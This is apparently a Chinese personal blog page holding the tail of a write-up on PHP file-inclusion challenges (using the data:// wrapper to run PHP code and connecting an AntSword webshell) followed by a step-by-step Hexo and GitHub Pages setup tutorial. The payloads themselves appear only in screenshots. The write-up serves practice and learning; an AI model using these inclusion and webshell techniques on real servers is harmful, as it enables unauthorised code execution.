<p><img src="/2023/07/20/php-include/AAwangzhan\1\hexoblog\source\image\image-20230720201235539.png"></p>
<p><img src="/2023/07/20/php-include/AAwangzhan\1\hexoblog\source\image\image-20230720201155971.png"></p>
<p>第二种链接方式：</p>
<p><img src="/2023/07/20/php-include/AAwangzhan\1\hexoblog\source\image\image-20230720201719427.png"></p>
<p>真的服了真个题了，那个base64编码再连蚁剑，那个密码1和a我都试了就是不行，用cxk就可以，妥妥的小黑子</p>
<p>大概跟base64编码有问题，以后面留长一点点，长记性</p>

        <h2 id="方法3（data-命令执行）">
          <a href="#方法3（data-命令执行）" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法3（data-命令执行）" class="headerlink" title="方法3（data:&#x2F;&#x2F;命令执行）"></a>方法3（data:&#x2F;&#x2F;命令执行）</h2>
      <p>只是data:&#x2F;&#x2F;协议的其中一个用法</p>
<p>data:&#x2F;&#x2F;协议跟php:&#x2F;&#x2F;input类似，可以让用户来控制输入流，当他与<strong>包含函数</strong>时，用户输入的data:&#x2F;&#x2F;流会被<strong>当做PHP代码执行</strong></p>
<p>构造方式跟input一样，不过变成了GET传参 </p>
<p><img src="/2023/07/20/php-include/AAwangzhan\1\hexoblog\source\image\image-20230720203539785.png"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/">Hexo+Github博客搭建教程（个人操作过程）</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-07-17</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="Hexo-Github博客搭建教程（个人操作过程）">
          <a href="#Hexo-Github博客搭建教程（个人操作过程）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hexo-Github博客搭建教程（个人操作过程）" class="headerlink" title="Hexo+Github博客搭建教程（个人操作过程）"></a><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Hexo&spm=1001.2101.3001.7020">Hexo</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>+Github博客搭建教程（个人操作过程）</h1>
      <p>最近自己尝试利用hexo+github搭建了blog，来记录一下过程</p>
<p>##一、准备环境</p>

        <h2 id="1、node环境">
          <a href="#1、node环境" class="heading-link"><i class="fas fa-link"></i></a><a href="#1、node环境" class="headerlink" title="1、node环境"></a>1、node环境</h2>
      <p>首先，安装 nodejs， 因为Hexo是基于 Node.js 驱动的一款博客框架。</p>
<p><strong><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://nodejs.cn/">http://nodejs.cn</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></strong> </p>

        <h2 id="2、git-环境">
          <a href="#2、git-环境" class="heading-link"><i class="fas fa-link"></i></a><a href="#2、git-环境" class="headerlink" title="2、git 环境"></a>2、git 环境</h2>
      <p>然后，安装git, 一个分布式版本控制系统，用于项目的版本控制管理，作者是 Linux 之父。</p>
<p>⭐Git（官网）<strong><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://git-scm.com/">https://git-scm.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></strong></p>
<p>太慢的话可以自行找资源</p>
<pre><code>安装过程一路next就行（安装路径可改）

两者安装完成之后，右击此电脑&gt;属性&gt;高级系统设置&gt;环境变量&gt;系统变量下的Path 可以看到两者已自动修改了环境变量，这是我们可以通过cmd命令（win+r后输入cmd）查看两者版本。(确认是否安装成功及可以使用) 查看Node.js版本命令：node -v 查看Git版本命令：git --version
</code></pre>

        <h2 id="3-之后进入GitHub创建一个仓库">
          <a href="#3-之后进入GitHub创建一个仓库" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-之后进入GitHub创建一个仓库" class="headerlink" title="3.之后进入GitHub创建一个仓库"></a>3.之后进入GitHub创建一个仓库</h2>
      <blockquote>
<p><strong>确认注册后会让用户选择公有还是私有仓库(私有的个人仓库好像需要Money好像是每月7美金)</strong><br><strong>个人博客的话直接选免费的就行了</strong><br><strong>注意仓库的取名格式：用户名.github.io(这将是以后的访问域名)</strong></p>
</blockquote>
<blockquote>
<p><strong>到这里代表我们Github账号以及仓库都已经创建完毕</strong><br><strong>可以把下面这段仓库的地址复制下来留着后面配置时会用到</strong></p>
</blockquote>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716091944628.png"></p>

        <h2 id="4-接下来进入本地配置安装Hexo">
          <a href="#4-接下来进入本地配置安装Hexo" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-接下来进入本地配置安装Hexo" class="headerlink" title="4. 接下来进入本地配置安装Hexo"></a>4. 接下来进入本地配置安装Hexo</h2>
      <p><strong>在磁盘中创建一个用来存放Github本地仓库文件的目录(可自定义目录存放，顾名思义blog&#x3D;&#x3D;博客)</strong></p>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716092108512.png"></p>
<p>选中创建的目录(文件夹)右键选择使用Gti Bash Here打开Git命令窗口(这就是开始安装的Git工具，现在开始使用)<br>也可以使用Windows的cmd命令行(不推荐)<br>(因为是从国外服务器下载，受网络的影响比较大，有可能会出现异常，所以我们需要连接国内淘宝官方的服务器来进行)<br>输入命令：npm install -g cnpm –registry&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>注：之后再次使用命令则是以cnpm开头~而不是npm<br><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716092323573.png"></p>
<blockquote>
<p><strong>正式开始安装hexo</strong><br><strong>输入命令：cnpm install -g hexo-cli</strong></p>
</blockquote>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716092359590.png"></p>
<blockquote>
<p><strong>之后就是初始化Hexo</strong><br><strong>输入命令：hexo init</strong></p>
</blockquote>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716092518819.png"></p>
<p><strong>这时我们创建的目录(文件夹)下已经多出许多文件</strong></p>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716092548657.png"></p>
<p>新建完成后，指定文件夹Hexo目录下有：</p>
<pre><code>node_modules: 依赖包
public：存放生成的页面
scaffolds：生成文章的一些模板
source：用来存放你的文章
themes：主题**
_config.yml: 博客的配置文件**
</code></pre>
<p>这样本地的网站配置也弄好啦，输入hexo g生成静态网页，然后输入hexo s打开本地服务器，</p>
<blockquote>
<p><strong>这时启动hexo之后在浏览器输入localhost:4000就可以在本地浏览博客(自带一篇Hello World博客)</strong><br><strong>输入命令：hexo s</strong><br><strong>关闭hexo ctrl + c</strong></p>
</blockquote>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716092739503.png"></p>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716092810228.png"></p>

        <h2 id="5-设置ssh">
          <a href="#5-设置ssh" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-设置ssh" class="headerlink" title="5. 设置ssh"></a>5. 设置ssh</h2>
      <blockquote>
<p><strong>生成sshkey</strong><br><strong>输入命令：cd ~&#x2F;.ssh进入.ssh文件</strong></p>
<p><strong>输入命令：ssh-keygen -t rsa -C ‘注册时的邮箱地址’</strong> </p>
</blockquote>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716093006803.png"></p>
<p><strong>此时我们去查看C盘目录(此文件夹所在C:\用户\用户名目录下)</strong></p>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716093119089.png"></p>
<p><strong>使用记事本打开id_rsa.put文件并复制生成的key</strong></p>
<p><strong>在已登陆的Github主页点击右侧头像 》 Settings设置</strong></p>
<p>再点击SSH and GPG keys 》 New SSH key</p>
<p><strong>将刚刚在.ssh目录下所复制id_rsa.pub文件中的信息复制进key(注意空格)，在给它取个名字(随意)</strong></p>
<blockquote>
<p><strong>这里需要在本地进行验证一次</strong><br><strong>输入命令：ssh -T <span class="exturl"><a class="exturl__link" href="mailto:&#103;&#x69;&#x74;&#x40;&#103;&#x69;&#x74;&#x68;&#117;&#x62;&#x2e;&#99;&#111;&#x6d;">&#103;&#x69;&#x74;&#x40;&#103;&#x69;&#x74;&#x68;&#117;&#x62;&#x2e;&#99;&#111;&#x6d;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 并且输入yes之后，行末尾会显示你的用户名</strong></p>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716093403459.png"></p>
</blockquote>
<p><strong>绑定成功并且会邮箱收到邮件</strong></p>
<blockquote>
<p><strong>接着在本地绑定与Github的用户名和邮箱</strong><br><strong>输入命令：git config –global user.name “注册时用户名”</strong><br><strong>输入命令：git config –global user.email “注册时邮箱”</strong></p>
</blockquote>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716093550811.png"></p>

        <h2 id="6-上传测试博客">
          <a href="#6-上传测试博客" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-上传测试博客" class="headerlink" title="6. 上传测试博客"></a>6. 上传测试博客</h2>
      <blockquote>
<p>打开并修改本地仓库目录下_config.yml文件</p>
</blockquote>
<blockquote>
<p><strong>在文件的末尾修改(repository属性的地址就是之前创建仓库后所保存的http地址)</strong><br>deploy:<br>type: git<br>repository: <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/%E7%94%A8%E6%88%B7%E5%90%8D/%E7%94%A8%E6%88%B7%E5%90%8D.github.io.git">https://github.com/用户名/用户名.github.io.git</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>branch: master</p>
</blockquote>
<blockquote>
<p><strong>此时需要安装一个上传工具</strong><br><strong>输入命令：cnpm install hexo-deployer-git</strong></p>
</blockquote>
<blockquote>
<p><strong>可以新建一篇测试文章(不新建的话也会有一篇自带的Hello World文章)</strong><br><strong>输入命令：hexo new “文章名称”</strong></p>
</blockquote>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716094542664.png"></p>
<blockquote>
<p><strong>新建文章之后需要生成一遍文件</strong><br><strong>输入命令：hexo g</strong></p>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716094611137.png"></p>
</blockquote>
<blockquote>
<p><strong>新建文章后可在本地先预览一遍</strong><br><strong>输入命令：hexo s浏览器输入：localhost:4000(ctrl + c 关闭)</strong></p>
</blockquote>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\20200331230142753.png"></p>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716094741275.png"></p>
<blockquote>
<p><strong>最后直接部署到Github就可以啦</strong><br><strong>输入命令：hexo d</strong></p>
</blockquote>
<p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20230716095642961.png"></p>
</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/2/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">Hello Stun</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">36</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Qingchuan</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>